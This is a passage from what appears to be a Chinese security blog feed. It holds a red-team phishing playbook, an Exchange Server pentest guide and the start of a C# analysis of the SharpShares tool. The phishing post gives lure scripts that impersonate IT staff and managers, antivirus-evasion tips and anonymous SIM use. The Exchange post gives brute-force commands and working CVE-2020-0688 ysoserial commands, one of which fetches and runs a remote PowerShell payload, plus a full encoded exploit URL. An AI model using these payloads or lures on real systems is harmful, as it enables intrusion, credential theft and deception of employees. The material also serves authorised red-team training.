href="#其他信息调研" class="headerlink" title="其他信息调研"></a>其他信息调研</h3><p>除了上述我们收集的目标信息，我们还需要尽可能的调研到以下几点：</p><ul><li><p>组织架构<br>部门领导信息、信息技术部成员信息、运维人员信息、新入职员工信息…</p></li><li><p>安全设备部署情况<br>TSM、HIDS、天眼、 EDR、赛门铁克、360、卡巴斯基…</p></li><li><p>……</p></li></ul><h2 id="钓鱼准备"><a href="#钓鱼准备" class="headerlink" title="钓鱼准备"></a>钓鱼准备</h2><h3 id="邮件服务器"><a href="#邮件服务器" class="headerlink" title="邮件服务器"></a>邮件服务器</h3><p>搭建邮服是为了方便我们发送钓鱼邮件，最好准备两台邮件服务器，一主一备。<br><img src="/2021/01/05/A-D-Phishing/ewomail.png" alt></p><ul><li><p>邮服搭建：<br><a href="https://www.iredmail.com/" target="_blank" rel="noopener">https://www.iredmail.com/</a><br><a href="http://www.ewomail.com/" target="_blank" rel="noopener">http://www.ewomail.com/</a></p></li><li><p>服务器选择：<br>阿里云、华为云等大型服务厂商会禁止搭建邮服，可以选择小型服务器提供商</p></li><li><p>伪装域名：<br>com/cn/co这样的后缀可以，top/me/xyz后缀容易被识破</p></li><li><p>SSL证书：<br>防止被归类为垃圾邮件</p></li></ul><h3 id="邮件正文编写"><a href="#邮件正文编写" class="headerlink" title="邮件正文编写"></a>邮件正文编写</h3><ul><li><p>标题<br>可以在标题上加上【紧急通知】字眼，催促对方查看邮件</p></li><li><p>正文主题<br>HW终端加固方案<br>内部软件更新包<br>客服态度恶劣举报<br>参赛作品投递</p></li><li><p>签名<br>很多公司都会有各自的签名，我们前期搞到一个邮箱的账号密码，就知道签名是什么样子了。</p></li><li><p>附件<br>木马附件添加压缩密码，压缩码直接写在正文中或者用图片格式插入。</p></li></ul><h3 id="CS服务器配置"><a href="#CS服务器配置" class="headerlink" title="CS服务器配置"></a>CS服务器配置</h3><ul><li>修改随机端口+密码</li><li>修改SSL证书</li><li>配置Malleable-C2-Profiles（隐藏隧道、伪装流量）</li><li>配置Server酱上线通知</li><li>使用便捷cna插件(on beacon_initial )</li><li>删除空格后门</li><li>删除stager特征</li><li>……<h3 id="免杀木马"><a href="#免杀木马" class="headerlink" title="免杀木马"></a>免杀木马</h3>对于前期调研的内部安全防护工具，针对性的制作免杀木马，减少在免杀上面花费的时间。</li><li>二进制免杀</li><li>静态免杀</li><li>动态免杀</li></ul><p><a href="https://github.com/TideSec/BypassAntiVirus" target="_blank" rel="noopener">https://github.com/TideSec/BypassAntiVirus</a></p><h3 id="匿名手机卡"><a href="#匿名手机卡" class="headerlink" title="匿名手机卡"></a>匿名手机卡</h3><p>用来进行电话钓鱼，防止被防守队溯源</p><ul><li>阿里小号（<a href="https://aliqin.tmall.com/）" target="_blank" rel="noopener">https://aliqin.tmall.com/）</a></li><li>寻找卡商购买匿名卡</li></ul><h3 id="绕过邮件网关"><a href="#绕过邮件网关" class="headerlink" title="绕过邮件网关"></a>绕过邮件网关</h3><p>有的时候我们发送的邮件会被拒收或者拦截，我们要尝试绕过：</p><ul><li>附件密码以图片形式插入，而非直接写在正文当中</li><li>附件和附件密码分开发送</li><li>不接收有附件的邮件，百度网盘，火狐网盘插入到正文当中</li></ul><h2 id="诱导"><a href="#诱导" class="headerlink" title="诱导"></a>诱导</h2><h3 id="安全意识"><a href="#安全意识" class="headerlink" title="安全意识"></a>安全意识</h3><p>我们在诱导的前期可以检查目标员工是否有安全意识，可以先发一个无毒文件过去，若验证对方没有很强的安全意识，我们可以再发木马过去，减少被发现钓鱼攻击的可能性。</p><h3 id="话语诱导"><a href="#话语诱导" class="headerlink" title="话语诱导"></a>话语诱导</h3><ul><li><p>伪装客户诱导客服<br>你们的xxx系统/app无法登陆，我发个截图给你们看吧！<br>请你们配合我的工作！不要耽误我的时间！</p></li><li><p>伪装运维人员诱导员工<br>你好，我是(信息)安全/管理部门的xxx，后台监测到您的电脑触发了告警，请使用我们提供的工具进行清理。<br>你好，我们后台监控到您的vpn存在异常，请提供账号密码（验证码）！情况紧急！</p></li><li><p>伪装上级诱导下属员工<br>我给你发了个表格，尽快帮我整理好，等会开会需要。</p></li><li><p>伪装钓鱼邮件被发现，进行回击<br>再发一封邮件：《关于近期收到钓鱼邮件应对措施》<br>由于近期钓鱼事件频发，为了避免公司内部网络木马感染，请运行公司下发的清理程序。<br>后台会实时监控您是否运行了程序，纳入绩效考核！请立即运行程序清理！</p></li></ul><h3 id="xss漏洞诱导"><a href="#xss漏洞诱导" class="headerlink" title="xss漏洞诱导"></a>xss漏洞诱导</h3><p>XSS配合Flash或者自制木马进行钓鱼<br><a href="https://github.com/r00tSe7en/Fake-flash.cn" target="_blank" rel="noopener">https://github.com/r00tSe7en/Fake-flash.cn</a></p><p>或者你觉得Flash钓鱼已经过时，可以结合CS脚本进行钓鱼。<br><a href="https://github.com/TheKingOfDuck/XSS-Fishing2-CS" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/XSS-Fishing2-CS</a><br><a href="https://github.com/timwhitez/Doge-XSS-Phishing" target="_blank" rel="noopener">https://github.com/timwhitez/Doge-XSS-Phishing</a></p><h2 id="权限维持"><a href="#权限维持" class="headerlink" title="权限维持"></a>权限维持</h2><p>我们会遇到员工下班关机或者使用的是云桌面，这个时候我们的权限第二天可能就没了，需要做好权限维持进行后续的内网渗透。</p><p>常见权限维持方法：</p><ul><li>修改注册表</li><li>修改服务（包括svchost-x…）</li><li>配置启动项</li><li>配置计划任务</li><li>Dll劫持(白加黑)</li><li>PE感染<br>……</li></ul><p>结合CS插件进行权限维持：<br><a href="https://github.com/0xthirteen/StayKit" target="_blank" rel="noopener">https://github.com/0xthirteen/StayKit</a><br><a href="https://github.com/0xthirteen/MoveKit" target="_blank" rel="noopener">https://github.com/0xthirteen/MoveKit</a></p><h2 id="后期复盘"><a href="#后期复盘" class="headerlink" title="后期复盘"></a>后期复盘</h2><p>后期需要对钓鱼的人员、获取的信息、木马的名称、邮箱的附件进行统计，方便后续的复盘以及清理。<br><img src="/2021/01/05/A-D-Phishing/after.png" alt><br>总结钓鱼中出现的问题，进行讨论给出解决方案，避免问题再次出现。</p><h1 id="蓝队溯源钓鱼流程"><a href="#蓝队溯源钓鱼流程" class="headerlink" title="蓝队溯源钓鱼流程"></a>蓝队溯源钓鱼流程</h1><p>作为防守人员，当我们收到钓鱼攻击的告警时，可以备份钓鱼样本或者邮件，分析其中能够利用的信息，如：</p><ul><li>IP/域名</li><li>邮箱</li><li>手机号</li><li>微信</li><li>QQ</li><li>支付宝</li><li>常用圈子ID</li><li>……</li></ul><p>若我们能够获取一个或者数个价值信息，可以由溯源小组开始进行溯源。</p><h2 id="溯源案例-虚假邮箱"><a href="#溯源案例-虚假邮箱" class="headerlink" title="溯源案例(虚假邮箱)"></a>溯源案例(虚假邮箱)</h2><p>背景：客户下午15:49收到钓鱼邮件，由于客户已将邮件删除，只收到了一张截图：<br><img src="/2021/01/05/A-D-Phishing/fanzhi1.png" alt><br>发送的邮件为163邮件，第一时间去查询QQ：<br><img src="/2021/01/05/A-D-Phishing/fanzhi3.png" alt><br>发现非个人使用的QQ，后续通过搜索引擎搜索该QQ号，发现账号为购买的测试账号，并且账号密码都有了。<br><img src="/2021/01/05/A-D-Phishing/fanzhi4.png" alt></p><p>登陆该账号的163邮箱，成功登陆，发现已发送的大量钓鱼邮件，可以看到也发了其他防守厂商的邮件。<br><img src="/2021/01/05/A-D-Phishing/fanzhi5.png" alt><br>网易邮箱可以查看登陆的地址，不过现在看不了IP了，这里可以看见攻击者在15:01登陆了该邮箱，可以猜测为北京的攻击队。<br><img src="/2021/01/05/A-D-Phishing/fanzhi6.png" alt></p><p>在邮件中获取攻击者的exe样本，放到沙箱上去分析，分析出攻击者的服务器IP地址：<br><img src="/2021/01/05/A-D-Phishing/fanzhi2.png" alt></p><p>这期间尝试过通过该IP从web层面反制，端口开发的比较少，没有思路，通过whois也没有查询出有价值的信息。</p><p>后来想到去尝试用zoomeye/shodan这样的搜索引擎去搜索IP，最终在FOFA上发现绑定的域名，其实也就是IP反查域名，当时没有第一时间想到这个点。<br><img src="/2021/01/05/A-D-Phishing/fanzhi7.png" alt></p><p>ping该域名与我们沙箱查出来的IP一致，再次搜索该域名，查到攻击者真实姓名：<br><img src="/2021/01/05/A-D-Phishing/fanzhi8.png" alt></p><p>访问该域名，为攻击者的博客地址，只留下了一个tg的用户名：<br><img src="/2021/01/05/A-D-Phishing/fanzhi9.png" alt></p><p>翻来覆去博客上也没有其他有价值的信息，没办法，通过两个ID查询也没有搜索出价值信息，看来攻击者隐藏的不错。</p><p>后续想着(既然你有博客，一般博客都有可能是通过Github搭建的，于是将博客地址放到Github上搜索)，搜索到博客的子域名。</p><p><img src="/2021/01/05/A-D-Phishing/fanzhi10.png" alt></p><p>这里攻击者的ID又变了，到目前为止有了3个ID。</p><p>当查到这里的时候，再想一想，Github还能提供什么有价值的信息？</p><p>由于Github会保留近期Git上项目的邮箱地址，可以通过该接口反查到邮箱：<a href="https://github.com/paulirish/github-email" target="_blank" rel="noopener">https://github.com/paulirish/github-email</a></p><p><img src="/2021/01/05/A-D-Phishing/fanzhi11.png" alt></p><p>继续搜索该gmail邮箱，搜索到twitter，定位到攻击者的家乡为四川省，并且发现和之前相同的ID。<br><img src="/2021/01/05/A-D-Phishing/fanzhi12.png" alt></p><p><img src="/2021/01/05/A-D-Phishing/fanzhi13.png" alt></p><p>到了现在我们搜索到攻击者的服务器IP、域名、真实姓名、邮箱以及4个ID号，最终通过猜解微信ID成功获取攻击者的微信，并且微信名称也为其中的一个ID。</p><p><img src="/2021/01/05/A-D-Phishing/fanzhi14.png" alt></p><p>整个溯源过程流程图如下<br><img src="/2021/01/05/A-D-Phishing/fanzhi15.png" alt></p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>钓鱼攻击已经成为攻防演练中的一个重要的、也是很常见的攻击方式，所以对于攻击方来说，明白溯源的思路，能够让我们更好的隐藏自己；防守方也可以猜解攻击者的习惯、以及攻击手法去进行溯源或者反制；对于参与攻防演习的甲方，可以配置邮件网关、沙箱等物理设备防范钓鱼攻击，同时可以组织内部钓鱼项目，提高员工安全意识。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;随着攻防演练的进行，外网能够直接进入内网必定会越来越困难，而且常规Web渗透耗时长，这个时候利用钓鱼攻击不仅效率高，并且能够为我们节省大量的时间和人力，说不定未来钓鱼攻击会成为每个一线渗透人员必须掌握的技能。&lt;/p&gt;
&lt;p&gt;钓鱼的手法有很多种，其中我们会遇到各种各样的问题，
      
    
    </summary>
    
    
    
      <category term="钓鱼" scheme="http://sherlocz.github.io/tags/%E9%92%93%E9%B1%BC/"/>
    
  </entry>
  
  <entry>
    <title>exchange基础渗透</title>
    <link href="http://sherlocz.github.io/2021/01/04/exchange-pentent/"/>
    <id>http://sherlocz.github.io/2021/01/04/exchange-pentent/</id>
    <published>2021-01-04T02:15:08.000Z</published>
    <updated>2021-01-11T06:04:25.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="定位exchange-server"><a href="#定位exchange-server" class="headerlink" title="定位exchange server"></a>定位exchange server</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -Q IMAP/*</span><br></pre></td></tr></table></figure><h1 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h1><p>可直接抓包爆破，不过后续会有验证码验证，可尝试其他接口进行爆破嗷<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">/ecp</span><br><span class="line">/ews</span><br><span class="line">/oab</span><br><span class="line">/owa</span><br><span class="line">/rpc</span><br><span class="line">/api</span><br><span class="line">/mapi</span><br><span class="line">/powershell</span><br><span class="line">/autodiscover</span><br><span class="line">/Microsoft-Server-ActiveSync</span><br></pre></td></tr></table></figure></p><h2 id="Ruler"><a href="#Ruler" class="headerlink" title="Ruler"></a>Ruler</h2><p>爆破<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ruler.exe --insecure --url https://exchange.hacke.testla</span><br><span class="line">b/autodiscover/autodiscover.xml brute --users user.txt --passwords pass1.txt --v</span><br><span class="line">erbose</span><br></pre></td></tr></table></figure></p><p><img src="/2021/01/04/exchange-pentent/ruler.png" alt></p><p>导出邮箱</p><h1 id="获取信息"><a href="#获取信息" class="headerlink" title="获取信息"></a>获取信息</h1><p>将HTTP版本主机修改成1.0<br>去掉HOST头，可获取内网ip地址<br><img src="/2021/01/04/exchange-pentent/ip.png" alt></p><p>使用nmap脚本获取主机信息<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap IP -p 443 --script http-ntlm-info --script-args http-ntlm-info.root=/rpc/rpcproxy.dll</span><br></pre></td></tr></table></figure></p><h1 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h1><h2 id="CVE-2020-0688"><a href="#CVE-2020-0688" class="headerlink" title="CVE-2020-0688"></a>CVE-2020-0688</h2><p>漏洞影响如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Microsoft Exchange Server 2010 Service Pack 3</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2013</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2016</span><br><span class="line"></span><br><span class="line">Microsoft Exchange Server 2019</span><br></pre></td></tr></table></figure></p><p>这个漏洞是2020年3月份出的漏洞，所以在这之前的小版本都没有</p><p>我这里安装的为 <strong>Exchange Server 2016 CU14</strong> ， 发布日期是在 2019 年 9 月 17 日</p><p><a href="https://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/" title="https://sherlocz.github.io/2020/10/30/how-to-install-exchange-server/">环境搭建链接</a></p><p>漏洞利用的前提是要获取一个Exchange的邮箱用户，我这里使用mail/Aa123456账号举例子</p><p>首先，可以使用<a href="https://github.com/zcgonvh/CVE-2020-0688" title="https://github.com/zcgonvh/CVE-2020-0688" target="_blank" rel="noopener">平头哥的工具</a>进行探测探测出存在漏洞</p><p><img src="/2021/01/04/exchange-pentent/vul.png" alt></p><p>接下来需要构造我们反序列化的payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">--validationkey = CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF（默认，漏洞产生原因）</span><br><span class="line"></span><br><span class="line">--validationalg = SHA1（默认，漏洞产生原因）</span><br><span class="line"></span><br><span class="line">--generator=B97B4E27（基本默认）</span><br><span class="line"></span><br><span class="line">--viewstateuserkey = ASP.NET_SessionId（手工获取，变量，每次登陆都不一致）</span><br></pre></td></tr></table></figure></p><p>除了viewstateuserkey这个值我们需要获取，其实其他的值基本上为默认的，无需改变</p><p>登陆我们域用户的邮箱，请求 /ecp/default.aspx </p><p><img src="/2021/01/04/exchange-pentent/default.png" alt></p><p>可以在我们请求中看到cookie值，我们需要cookie中的ASP.NET_SessionId值</p><p>接下来使用ysoserial.net构造反序列化内容：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#调用计算器</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;calc.exe&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line">#写入文件</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;cmd /c echo test &gt; C:\1.txt&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line">#判断出网</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;ping xxx.dnslog.io&quot; --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br><span class="line"></span><br><span class="line">#反弹CS</span><br><span class="line">ysoserial.exe -p ViewState -g TextFormattingRunProperties -c &quot;cmd /c powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(&apos;http://xx.xx.xx.xx/a&apos;))&quot;  --validationalg=&quot;SHA1&quot; --validationkey=&quot;CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF&quot; --generator=&quot;B97B4E27&quot; --viewstateuserkey=&quot;9a4c9f7e-88d1-4136-b987-a28a440090bd&quot; --isdebug --islegacy</span><br></pre></td></tr></table></figure><p><img src="/2021/01/04/exchange-pentent/calc.png" alt></p><p>将生成的反序列化内容进行url编码，最终构造出的url如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/ecp/default.aspx?__VIEWSTATEGENERATOR=B97B4E27&amp;__VIEWSTATE=%2fwEylAcAAQAAAP%2f%2f%2f%2f8BAAAAAAAAAAwCAAAAXk1pY3Jvc29mdC5Qb3dlclNoZWxsLkVkaXRvciwgVmVyc2lvbj0zLjAuMC4wLCBDdWx0dXJlPW5ldXRyYWwsIFB1YmxpY0tleVRva2VuPTMxYmYzODU2YWQzNjRlMzUFAQAAAEJNaWNyb3NvZnQuVmlzdWFsU3R1ZGlvLlRleHQuRm9ybWF0dGluZy5UZXh0Rm9ybWF0dGluZ1J1blByb3BlcnRpZXMBAAAAD0ZvcmVncm91bmRCcnVzaAECAAAABgMAAAC2BTw%2feG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9InV0Zi04Ij8%2bDQo8T2JqZWN0RGF0YVByb3ZpZGVyIE1ldGhvZE5hbWU9IlN0YXJ0IiBJc0luaXRpYWxMb2FkRW5hYmxlZD0iRmFsc2UiIHhtbG5zPSJodHRwOi8vc2NoZW1hcy5taWNyb3NvZnQuY29tL3dpbmZ4LzIwMDYveGFtbC9wcmVzZW50YXRpb24iIHhtbG5zOnNkPSJjbHItbmFtZXNwYWNlOlN5c3RlbS5EaWFnbm9zdGljczthc3NlbWJseT1TeXN0ZW0iIHhtbG5zOng9Imh0dHA6Ly9zY2hlbWFzLm1pY3Jvc29mdC5jb20vd2luZngvMjAwNi94YW1sIj4NCiAgPE9iamVjdERhdGFQcm92aWRlci5PYmplY3RJbnN0YW5jZT4NCiAgICA8c2Q6UHJvY2Vzcz4NCiAgICAgIDxzZDpQcm9jZXNzLlN0YXJ0SW5mbz4NCiAgICAgICAgPHNkOlByb2Nlc3NTdGFydEluZm8gQXJndW1lbnRzPSIvYyBjYWxjLmV4ZSIgU3RhbmRhcmRFcnJvckVuY29kaW5nPSJ7eDpOdWxsfSIgU3RhbmRhcmRPdXRwdXRFbmNvZGluZz0ie3g6TnVsbH0iIFVzZXJOYW1lPSIiIFBhc3N3b3JkPSJ7eDpOdWxsfSIgRG9tYWluPSIiIExvYWRVc2VyUHJvZmlsZT0iRmFsc2UiIEZpbGVOYW1lPSJjbWQiIC8%2bDQogICAgICA8L3NkOlByb2Nlc3MuU3RhcnRJbmZvPg0KICAgIDwvc2Q6UHJvY2Vzcz4NCiAgPC9PYmplY3REYXRhUHJvdmlkZXIuT2JqZWN0SW5zdGFuY2U%2bDQo8L09iamVjdERhdGFQcm92aWRlcj4LiS1M1wqJue%2b7G01o9Xv39is4dIc%3d</span><br></pre></td></tr></table></figure></p><p>访问url，报错500，其实成功<br><img src="/2021/01/04/exchange-pentent/500.png" alt></p><p>登陆Exchange邮服，成功调用calc.exe</p><p><img src="/2021/01/04/exchange-pentent/calc.png" alt></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.freebuf.com/vuls/228735.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/228735.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;定位exchange-server&quot;&gt;&lt;a href=&quot;#定位exchange-server&quot; class=&quot;headerlink&quot; title=&quot;定位exchange server&quot;&gt;&lt;/a&gt;定位exchange server&lt;/h1&gt;&lt;figure class
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://sherlocz.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="exchange" scheme="http://sherlocz.github.io/tags/exchange/"/>
    
  </entry>
  
  <entry>
    <title>CSharp学习--sharpshares代码分析</title>
    <link href="http://sherlocz.github.io/2020/12/22/sharpshares-code/"/>
    <id>http://sherlocz.github.io/2020/12/22/sharpshares-code/</id>
    <published>2020-12-22T07:43:03.000Z</published>
    <updated>2020-12-22T10:10:09.942Z</updated>
    
    <content type="html"><![CDATA[<p>GitHub地址：<a href="https://github.com/djhohnstein/SharpShares" title="https://github.com/djhohnstein/SharpShares" target="_blank" rel="noopener">SharpShares</a></p><p>使用Visual Studio编译，运行效果(域环境)如下，列出了域内所有机器的共享，分为Unreadable Shares(不可读的)和Listable Shares(可读的)：<br><img src="/2020/12/22/sharpshares-code/xiaoguo.png" alt></p><h1 id="原理流程图"><a href="#原理流程图" class="headerlink" title="原理流程图"></a>原理流程图</h1><p><img src="/2020/12/22/sharpshares-code/process.png" alt></p><h2 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h2><p>在我们看到不会的方法的时候，可以去参考官方文档：<a href="https://docs.microsoft.com/zh-cn/dotnet/api" title="https://docs.microsoft.com/zh-cn/dotnet/api" target="_blank" rel="noopener">dotnetapi查询</a></p><p>先来看看几段关键代码</p><p>测试代码1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">#获取当前域</span><br><span class="line">Console.WriteLine(&quot;Current DC :&quot; + Domain.GetCurrentDomain());</span><br><span class="line">#获取本机用户名</span><br><span class="line">Console.WriteLine(&quot;Current User:&quot; + WindowsIdentity.GetCurrent().Name.Split(&apos;\\&apos;)[1]);</span><br><span class="line">#判断当前是否是System权限</span><br><span class="line">Console.WriteLine(&quot;IsSystem:&quot; + WindowsIdentity.GetCurrent().IsSystem);</span><br><span class="line">#获取当前token id</span><br><span class="line">Console.WriteLine(&quot;Current Token:&quot; + WindowsIdentity.GetCurrent().Token);</span><br><span class="line">#获取当前主机名</span><br><span class="line">Console.WriteLine(&quot;Host Name:&quot; + System.Net.Dns.GetHostName());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>效果如下：<br><img src="/2020/12/22/sharpshares-code/1.png" alt></p><p>测试代码2<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public static void Main(string[] args)</span><br><span class="line">&#123;</span><br><span class="line">#获取当前机器的ip，首先利用GetHostName方法获取主机名，将主机名作为参数传入GetHostAddresses中</span><br><span class="line">IPAddress[] ips = System.Net.Dns.GetHostAddresses(System.Net.Dns.GetHostName());</span><br><span class="line">    foreach (IPAddress ip in ips)</span><br><span class="line">    &#123;</span><br><span class="line">        if (!ip.ToString().Contains(&quot;:&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine(&quot;&#123;0&#125;: &#123;1&#125;&quot;, System.Net.Dns.GetHostName(), ip);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>效果如下：<br><img src="/2020/12/22/sharpshares-code/2.png" alt></p><p>测试代码3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.DirectoryServices;</span><br><span class="line">using System.DirectoryServices.ActiveDirectory;</span><br><span class="line">using System.Net;</span><br><span class="line">using System.Net.NetworkInformation;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Security.Principal;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.Runtime.InteropServices;</span><br><span class="line"></span><br><span class="line">namespace ConsoleApp2</span><br><span class="line">&#123;</span><br><span class="line">    class Program</span><br><span class="line">    &#123;</span><br><span class="line">        #region External Calls</span><br><span class="line">        [DllImport(&quot;Netapi32.dll&quot;, SetLastError = true)]</span><br><span class="line">        static extern int NetApiBufferFree(IntPtr Buffer);</span><br><span class="line">        [DllImport(&quot;Netapi32.dll&quot;, CharSet = CharSet.Unicode)]</span><br><span class="line">        private static extern int NetShareEnum(</span><br><span class="line">             StringBuilder ServerName,</span><br><span class="line">             int level,</span><br><span class="line">             ref IntPtr bufPtr,</span><br><span class="line">             uint prefmaxlen,</span><br><span class="line">             ref int entriesread,</span><br><span class="line">             ref int totalentries,</span><br><span class="line">             ref int resume_handle</span><br><span class="line">             );</span><br><span class="line">        #endregion</span><br><span class="line">        #region External Structures</span><br><span class="line">        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]</span><br><span class="line">        public struct SHARE_INFO_1</span><br><span class="line">        &#123;</span><br><span class="line">            public string shi1_netname;</span><br><span class="line">            public uint shi1_type;</span><br><span class="line">            public string shi1_remark;</span><br><span class="line">            public SHARE_INFO_1(string sharename, uint sharetype, string remark)</span><br><span class="line">            &#123;</span><br><span class="line">                this.shi1_netname = sharename;</span><br><span class="line">                this.shi1_type = sharetype;</span><br><span class="line">                this.shi1_remark = remark;</span><br><span class="line">            &#125;</span><br><span class="line">            public override string ToString()</span><br><span class="line">            &#123;</span><br><span class="line">                return shi1_netname;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        #endregion</span><br><span class="line">        const uint MAX_PREFERRED_LENGTH = 0xFFFFFFFF;</span><br><span class="line">        const int NERR_Success = 